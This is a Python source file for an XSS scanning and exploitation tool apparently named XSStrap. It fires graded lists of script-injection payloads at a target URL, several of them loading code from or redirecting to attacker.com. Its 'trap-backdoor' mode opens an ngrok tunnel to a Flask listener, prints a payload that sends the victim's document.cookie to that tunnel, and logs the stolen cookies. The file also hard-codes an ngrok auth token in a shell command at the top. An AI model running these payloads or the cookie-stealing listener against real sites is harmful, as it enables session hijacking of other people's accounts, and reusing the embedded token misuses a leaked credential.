import os
os.system("ngrok config add-authtoken 2EcFi3NgdSCjz541gmD1ChlnGOr_6wiepJMBeBSVCGoRkm5Lf || ./ngrok config add-authtoken 2EcFi3NgdSCjz541gmD1ChlnGOr_6wiepJMBeBSVCGoRkm5Lf")
os.system("cls || clear")
import hashlib
from datetime import datetime
from flask import Flask, request
from pyngrok import ngrok
from colorama import init, Fore
import argparse
import requests
import time
from random_user_agent.user_agent import UserAgent
from random_user_agent.params import SoftwareName, OperatingSystem
from urllib.parse import urlparse

init()

print(f"""{Fore.LIGHTGREEN_EX}
__   __ _____ _____ _                   
\ \ / //  ___/  ___| |    {Fore.YELLOW}[V0.01 #Senseless]{Fore.RESET}   {Fore.LIGHTGREEN_EX}           
 \ V / \ `--.\ `--.| |_ _ __ __ _ _ __  
 /   \  `--. \`--. \ __| '__/ _` | '_ \ 
/ /^\ \/\__/ /\__/ / |_| | | (_| | |_) |
\/   \/\____/\____/ \__|_|  \__,_| .__/ 
                                 | | 
                                 |_|{Fore.RESET}
""")

def check_xss(url, payload, headers, cookies, sleep_second=None, trap_backdoor=False):
    full_url = f"{url}{payload}"

    if sleep_second:

        time.sleep(float(sleep_second))


    response = requests.get(url=full_url, headers=headers, cookies=cookies)
    text_to_hash = url+payload

    hashed_text = hashlib.sha256(text_to_hash.encode()).hexdigest()

    # Check the HTTP response code
    if response.status_code == 200 and payload in response.text:
        current_time = datetime.now().strftime("%H:%M:%S")
        print(f"[{Fore.CYAN}{current_time}{Fore.RESET}] [{Fore.LIGHTGREEN_EX}INFO{Fore.RESET}] Potential XSS payload found")

        print(f"""
[{Fore.YELLOW}Potential Payloads{Fore.RESET}]
        Payload: {payload}
        Full: {url}{payload}
        Hash: {hashed_text}
        """)
        if trap_backdoor:
            print(f"[{Fore.MAGENTA}TRAP-BACKDOOR{Fore.RESET}]")
            app = Flask(__name__)

            @app.route('/')
            def home():
                # Get all parameters in the request and print them
                all_params = request.args.items()
                for param, value in all_params:
                    print(f"{Fore.YELLOW} Cookie:{param}={value} {Fore.RESET}")

                return "404 Not Found!"

            def start_ngrok():
                public_url = ngrok.connect(5000)
                ngrok_url = public_url.public_url.replace("NgrokTunnel: ", "").split(" -> ")[0]
                return ngrok_url

            if __name__ == '__main__':
                ngrok_url = start_ngrok()
                print(f"Ngrok URL: {ngrok_url}")
                print(f'Payload Backdoor-Url: <script>var i=new Image;i.src="{ngrok_url}/?" +document.cookie;</script>')

                app.run(port=5000)

        exit()
    else:
        print(f"{Fore.RED}XSS not found: {payload}{Fore.RESET}")

def extract_file_extension(url):
    parsed_url = urlparse(url)
    _, file_extension = os.path.splitext(parsed_url.path)
    return file_extension.lower()

def argument():
    parser = argparse.ArgumentParser(description='Perform XSS check on a given URL.')

    parser.add_argument('-u', '--url', required=True, help='Target URL (e.g., "http://www.site.com/vuln.php?id=1")')

    parser.add_argument('-s', '--sleep-second', type=float, default=None, dest='sleep_second', help='Perform operations with certain seconds')

    parser.add_argument('-c', '--cookie', default=None,
                        help='HTTP Cookie header value (e.g., "PHPSESSID=a8d127e..")')

    parser.add_argument('-a', '--random-agent', action='store_true',
                        help='Use randomly selected HTTP User-Agent header value')

    parser.add_argument('-t', '--trap-backdoor', '--trap-backdoor', action='store_true',
                        help='Create a backdoor via the URL')

    parser.add_argument('-l', '--level', default=None,
                        help='Specify a security level (e.g., low, medium, high)')

    #parser.add_argument('-r', '--risk', default=None, help='Specify a risk level (e.g., low, medium, high)') #BETA OFF

    args = parser.parse_args()

    file_extension = extract_file_extension(args.url)

    # If the user did not specify the -cookie argument, set it to None by default
    header = {}
    cookies = {}

    if args.cookie:
        header["Cookie"] = args.cookie
        cookies = {cookie.split(':')[0]: cookie.split(':')[1] for cookie in args.cookie.split('; ')}

    # If the user specified the -random-agent argument, select a random User-Agent
    if args.random_agent:
        software_names = [SoftwareName.CHROME.value, SoftwareName.FIREFOX.value]
        operating_systems = [OperatingSystem.WINDOWS.value, OperatingSystem.LINUX.value]
        user_agent_rotator = UserAgent(software_names=software_names, operating_systems=operating_systems, limit=100)
        header["User-Agent"] = user_agent_rotator.get_random_user_agent()

    xss_list = []

    def level1():
        nonlocal xss_list
        # Choose payload based on file extension
        if file_extension in ['.asp', '.aspx', '.jsp']:
            xss_list = [
                '\'><script>alert(1)</script>',
                '\'><div onmouseover=\'alert(1)\'>Hover me</div>',
                '\'><body onload=alert(1)>',
                '\'><svg/onload=alert(1)>'
            ]
        elif file_extension in ['.php']:
            xss_list = [
                '<script>alert(1)</script>',
                '<img src=x onerror=alert(1)>',
                '<body onload=alert(1)>',
                '<svg/onload=alert(1)>',
            ]
        elif file_extension in ['.js']:
            xss_list = [
                'alert(1)',
                'prompt(1)',
                'confirm(1)',
                'console.log(1)',
                'console.error(1)',
                'console.warn(1)',
                'console.debug(1)',
                'console.trace(1)',
                'console.info(1)',
                'document.write("XSS")',
                'document.writeln("XSS")',
                'console.log(String.fromCharCode(88,83,83))',
                'console.log(String.fromCharCode(72,69,76,76,79))',
                'console.log(String.fromCharCode(72,69,76,76,79) + " " + String.fromCharCode(87,79,82,76,68))',
                'alert`1`',
                'prompt`1`',
                'confirm`1`'
            ]
        else:
            xss_list = []

        for payload in xss_list:
            check_xss(args.url, payload, header, cookies, args.sleep_second,args.trap_backdoor)

    def level2():
        nonlocal xss_list
        # Choose payload based on file extension
        if file_extension in ['.asp', '.aspx', '.jsp']:
            xss_list = [
                '\'><script>alert(1);prompt(1)</script>',
                '\'><div onmouseover=\'alert(1);prompt(1)\'>Hover me</div>',
                '\'><body onload=alert(1);prompt(1)>',
                '\'><svg/onload=alert(1);prompt(1)>'
            ]
        elif file_extension in ['.php']:
            xss_list = [
                '<script>alert(1)</script>',
                '<img src=x onerror=alert(1)>',
                '<body onload=alert(1)>',
                '<svg/onload=alert(1)>',
                '<script>alert(1);prompt(1)</script>',
                '<img src=x onerror=\'alert(1);prompt(1)\'>',
                '<body onload=alert(1);prompt(1)>',
                '<svg/onload=\'alert(1);prompt(1)\'>'
            ]
        elif file_extension in ['.js']:
            xss_list = [
                'alert(1)',
                'prompt(1)',
                'confirm(1)',
                'console.log(1)',
                'console.error(1)',
                'console.warn(1)',
                'console.debug(1)',
                'console.trace(1)',
                'console.info(1)',
                'document.write("XSS")',
                'document.writeln("XSS")',
                'console.log(String.fromCharCode(88,83,83))',
                'console.log(String.fromCharCode(72,69,76,76,79))',
                'console.log(String.fromCharCode(72,69,76,76,79) + " " + String.fromCharCode(87,79,82,76,68))',
                'alert`1`',
                'prompt`1`',
                'confirm`1`',
                'eval("alert(1)")',
                'eval("prompt(1)")',
                'eval("confirm(1)")',
                'setTimeout("alert(1)", 1000)',
                'setInterval("alert(1)", 1000)',
                'location.href="http://attacker.com"',
                'history.pushState("", "", "http://attacker.com")',
                'history.replaceState("", "", "http://attacker.com")'
            ]

        else:
            xss_list = []

        for payload in xss_list:
            check_xss(args.url, payload, header, cookies, args.sleep_second,args.trap_backdoor)

    def level3():
        nonlocal xss_list
        # Choose payload based on file extension
        if file_extension in ['.asp', '.aspx', '.jsp']:
            xss_list = [
                '\'><script>alert(1);prompt(1)</script>',
                '\'><div onmouseover=\'alert(1);prompt(1)\'>Hover me</div>',
                '\'><body onload=alert(1);prompt(1)>',
                '\'><svg/onload=alert(1);prompt(1)>',
                '\'><script src=http://attacker.com/malicious.js></script>',
                '\'><div onmouseover=\'document.write("<script src=http://attacker.com/malicious.js></script>")\'>Hover me</div>',
                '\'><body onload=document.write("<script src=http://attacker.com/malicious.js></script>")>',
                '\'><svg/onload=document.write("<script src=http://attacker.com/malicious.js></script>")>'
            ]
        elif file_extension in ['.php']:
            xss_list = [
                '<script>alert(1)</script>',
                '<img src=x onerror=alert(1)>',
                '<body onload=alert(1)>',
                '<svg/onload=alert(1)>',
                '<script>alert(1);prompt(1)</script>',
                '<img src=x onerror=\'alert(1);prompt(1)\'>',
                '<body onload=alert(1);prompt(1)>',
                '<svg/onload=\'alert(1);prompt(1)\'',
                '<script src=http://attacker.com/malicious.js></script>',
                '<img src=x onerror=\'document.write("<script src=http://attacker.com/malicious.js></script>")\'>',
                '<body onload=document.write("<script src=http://attacker.com/malicious.js></script>")>',
                '<svg/onload=document.write("<script src=http://attacker.com/malicious.js></script>")>'
            ]
        elif file_extension in ['.js']:
            xss_list = [
                'alert(1)',
                'prompt(1)',
                'confirm(1)',
                'console.log(1)',
                'console.error(1)',
                'console.warn(1)',
                'console.debug(1)',
                'console.trace(1)',
                'console.info(1)',
                'document.write("XSS")',
                'document.writeln("XSS")',
                'console.log(String.fromCharCode(88,83,83))',
                'console.log(String.fromCharCode(72,69,76,76,79))',
                'console.log(String.fromCharCode(72,69,76,76,79) + " " + String.fromCharCode(87,79,82,76,68))',
                'alert`1`',
                'prompt`1`',
                'confirm`1`',
                'eval("alert(1)")',
                'eval("prompt(1)")',
                'eval("confirm(1)")',
                'setTimeout("alert(1)", 1000)',
                'setInterval("alert(1)", 1000)',
                'location.href="http://attacker.com"',
                'history.pushState("", "", "http://attacker.com")',
                'history.replaceState("", "", "http://attacker.com")',
                'var script = document.createElement("script"); script.src = "http://attacker.com/malicious.js"; document.body.appendChild(script);',
                'var xhr = new XMLHttpRequest(); xhr.open("GET", "http://attacker.com/malicious.js", true); xhr.send();',
                'var link = document.createElement("link"); link.rel = "stylesheet"; link.href = "http://attacker.com/malicious.css"; document.head.appendChild(link);'
            ]
        else:
            xss_list = []

        for payload in xss_list:
            check_xss(args.url, payload, header, cookies, args.sleep_second,args.trap_backdoor)

    def level4():
        nonlocal xss_list
        # Choose payload based on file extension
        if file_extension in ['.asp', '.aspx']:
            xss_list = [
                '\'><script>alert(1);prompt(1)</script>',
                '\'><div onmouseover=\'alert(1);prompt(1)\'>Hover me</div>',
                '\'><body onload=alert(1);prompt(1)>',
                '\'><svg/onload=alert(1);prompt(1)>',
                '\'><script src=http://attacker.com/malicious.js></script>',
                '\'><div onmouseover=\'document.write("<script src=http://attacker.com/malicious.js></script>")\'>Hover me</div>',
                '\'><body onload=document.write("<script src=http://attacker.com/malicious.js></script>")>',
                '\'><svg/onload=document.write("<script src=http://attacker.com/malicious.js></script>")>',
                '\'><script>var payload = \'alert(1);prompt(1)\'; eval(payload);</script>',
                '\'><div onmouseover=\'var payload="alert(1);prompt(1)";eval(payload)\'>Hover me</div>',
                '\'><body onload=\'var payload="alert(1);prompt(1)";eval(payload)\'>',
                '\'><svg/onload=\'var payload="alert(1);prompt(1)";eval(payload)>\''
            ]
        elif file_extension in ['.php']:
            xss_list = [
                '<script>alert(1)</script>',
                '<img src=x onerror=alert(1)>',
                '<body onload=alert(1)>',
                '<svg/onload=alert(1)>',
                '<script>alert(1);prompt(1)</script>',
                '<img src=x onerror=\'alert(1);prompt(1)\'>',
                '<body onload=alert(1);prompt(1)>',
                '<svg/onload=\'alert(1);prompt(1)\'',
                '<script>var payload = \'alert(1);prompt(1)\'; eval(payload);</script>',
                '<img src=x onerror=\'var payload="alert(1);prompt(1)";eval(payload)\'>',
                '<body onload=\'var payload="alert(1);prompt(1)";eval(payload)\'>',
                '<svg/onload=\'var payload="alert(1);prompt(1)";eval(payload)\''
            ]
        elif file_extension in ['.js']:
            xss_list = [
                'alert(1)',
                'prompt(1)',
                'confirm(1)',
                'console.log(1)',
                'console.error(1)',
                'console.warn(1)',
                'console.debug(1)',
                'console.trace(1)',
                'console.info(1)',
                'document.write("XSS")',
                'document.writeln("XSS")',
                'console.log(String.fromCharCode(88,83,83))',
                'console.log(String.fromCharCode(72,69,76,76,79))',
                'console.log(String.fromCharCode(72,69,76,76,79) + " " + String.fromCharCode(87,79,82,76,68))',
                'alert`1`',
                'prompt`1`',
                'confirm`1`',
                'eval("alert(1)")',
                'eval("prompt(1)")',
                'eval("confirm(1)")',
                'setTimeout("alert(1)", 1000)',
                'setInterval("alert(1)", 1000)',
                'location.href="http://attacker.com"',
                'history.pushState("", "", "http://attacker.com")',
                'history.replaceState("", "", "http://attacker.com")',
                'var script = document.createElement("script"); script.src = "http://attacker.com/malicious.js"; document.body.appendChild(script);',
                'var xhr = new XMLHttpRequest(); xhr.open("GET", "http://attacker.com/malicious.js", true); xhr.send();',
                'var link = document.createElement("link"); link.rel = "stylesheet"; link.href = "http://attacker.com/malicious.css"; document.head.appendChild(link);',
                'var payload = \'alert(1);prompt(1)\'; eval(payload);',
                'var payload = \'var xhr = new XMLHttpRequest(); xhr.open("GET", "http://attacker.com/malicious.js", true); xhr.send();\'; eval(payload);',
                'var payload = \'var link = document.createElement("link"); link.rel = "stylesheet"; link.href = "http://attacker.com/malicious.css"; document.head.appendChild(link);\'; eval(payload);'
            ]
        else:
            xss_list = []

        for payload in xss_list:
            check_xss(args.url, payload, header, cookies, args.sleep_second,args.trap_backdoor)

    def level5():
        nonlocal xss_list
        # Choose payload based on file extension
        if file_extension in ['.asp', '.aspx', '.jsp']:
            xss_list = [
                '\'><script>alert(1)</script>',
                '\'><div onmouseover=\'alert(1)\'>Hover me</div>',
                '\'><body onload=alert(1)>',
                '\'><svg/onload=alert(1)>',
                '\'><script>alert(1);prompt(1)</script>',
                '\'><div onmouseover=\'alert(1);prompt(1)\'>Hover me</div>',
                '\'><body onload=alert(1);prompt(1)>',
                '\'><svg/onload=alert(1);prompt(1)>',
                '\'><script src=http://attacker.com/malicious.js></script>',
                '\'><div onmouseover=\'document.write("<script src=http://attacker.com/malicious.js></script>")\'>Hover me</div>',
                '\'><body onload=document.write("<script src=http://attacker.com/malicious.js></script>")>',
                '\'><svg/onload=document.write("<script src=http://attacker.com/malicious.js></script>")>',
                '\'><script>var payload = \'alert(1);prompt(1)\'; eval(payload);</script>',
                '\'><div onmouseover=\'var payload="alert(1);prompt(1)";eval(payload)\'>Hover me</div>',
                '\'><body onload=\'var payload="alert(1);prompt(1)";eval(payload)\'>',
                '\'><svg/onload=\'var payload="alert(1);prompt(1)";eval(payload)>\'',
                '\'><div onmouseover=\'var payload="alert(1);prompt(1)";eval(payload)\'>Hover me</div><script src=http://attacker.com/malicious.js></script>',
                '\'><body onload=\'var payload="alert(1);prompt(1)";eval(payload)\'><script src=http://attacker.com/malicious.js></script>',
                '\'><svg/onload=\'var payload="alert(1);prompt(1)";eval(payload)\'><script src=http://attacker.com/malicious.js></script>',
                '\'><script>var payload = \'alert(1);prompt(1)\'; eval(payload);</script><div onmouseover=\'var payload="alert(1);prompt(1)";eval(payload)\'>Hover me</div>'
            ]
        elif file_extension in ['.php']:
            xss_list = [
                '<script>alert(1)</script>',
                '<img src=x onerror=alert(1)>',
                '<body onload=alert(1)>',
                '<svg/onload=alert(1)>',
                '<script>alert(1);prompt(1)</script>',
                '<img src=x onerror=\'alert(1);prompt(1)\'>',
                '<body onload=alert(1);prompt(1)>',
                '<svg/onload=\'alert(1);prompt(1)\'',
                '<script src=http://attacker.com/malicious.js></script>',
                '<img src=x onerror=\'document.write("<script src=http://attacker.com/malicious.js></script>")\'>',
                '<body onload=document.write("<script src=http://attacker.com/malicious.js></script>")>',
                '<svg/onload=document.write("<script src=http://attacker.com/malicious.js></script>")>',
                '<script>var payload = \'alert(1);prompt(1)\'; eval(payload);</script>',
                '<img src=x onerror=\'var payload="alert(1);prompt(1)";eval(payload)\'>',
                '<body onload=\'var payload="alert(1);prompt(1)";eval(payload)\'>',
                '<svg/onload=\'var payload="alert(1);prompt(1)";eval(payload)\'',
                '<div onmouseover=\'var payload="alert(1);prompt(1)";eval(payload)\'>Hover me</div><script src=http://attacker.com/malicious.js></script>',
                '<body onload=\'var payload="alert(1);prompt(1)";eval(payload)\'><script src=http://attacker.com/malicious.js></script>',
                '<svg/onload=\'var payload="alert(1);prompt(1)";eval(payload)\'><script src=http://attacker.com/malicious.js></script>',
                '<script>var payload = \'alert(1);prompt(1)\'; eval(payload);</script><div onmouseover=\'var payload="alert(1);prompt(1)";eval(payload)\'>Hover me</div>'
            ]
        elif file_extension in ['.js']:
            xss_list = [
                'alert(1)',
                'prompt(1)',
                'confirm(1)',
                'console.log(1)',
                'console.error(1)',
                'console.warn(1)',
                'console.debug(1)',
                'console.trace(1)',
                'console.info(1)',
                'document.write("XSS")',
                'document.writeln("XSS")',
                'console.log(String.fromCharCode(88,83,83))',
                'console.log(String.fromCharCode(72,69,76,76,79))',
                'console.log(String.fromCharCode(72,69,76,76,79) + " " + String.fromCharCode(87,79,82,76,68))',
                'alert`1`',
                'prompt`1`',
                'confirm`1`',
                'eval("alert(1)")',
                'eval("prompt(1)")',
                'eval("confirm(1)")',
                'setTimeout("alert(1)", 1000)',
                'setInterval("alert(1)", 1000)',
                'location.href="http://attacker.com"',
                'history.pushState("", "", "http://attacker.com")',
                'history.replaceState("", "", "http://attacker.com")',
                'var script = document.createElement("script"); script.src = "http://attacker.com/malicious.js"; document.body.appendChild(script);',
                'var xhr = new XMLHttpRequest(); xhr.open("GET", "http://attacker.com/malicious.js", true); xhr.send();',
                'var link = document.createElement("link"); link.rel = "stylesheet"; link.href = "http://attacker.com/malicious.css"; document.head.appendChild(link);',
                'var payload = \'alert(1);prompt(1)\'; eval(payload);',
                'var payload = \'var xhr = new XMLHttpRequest(); xhr.open("GET", "http://attacker.com/malicious.js", true); xhr.send();\'; eval(payload);',
                'var payload = \'var link = document.createElement("link"); link.rel = "stylesheet"; link.href = "http://attacker.com/malicious.css"; document.head.appendChild(link);\'; eval(payload);',
                'var payload = \'eval("alert(1);prompt(1)")\'; eval(payload);',
                'var payload = \'eval("var xhr = new XMLHttpRequest(); xhr.open(\\"GET\\", \\"http://attacker.com/malicious.js\\", true); xhr.send();")\'; eval(payload);',
                'var payload = \'eval("var link = document.createElement(\\"link\\"); link.rel = \\"stylesheet\\"; link.href = \\"http://attacker.com/malicious.css\\"; document.head.appendChild(link);")\'; eval(payload);'
            ]
        else:
            xss_list = []

        for payload in xss_list:
            check_xss(args.url, payload, header, cookies, args.sleep_second,args.trap_backdoor)

    if args.level == '1':
        level1()
    elif args.level == '2':
        level2()
    elif args.level == '3':
        level3()
    elif args.level == '4':
        level4()
    elif args.level == '5':
        level5()
    else:
        level1()

if __name__ == '__main__':
    argument()
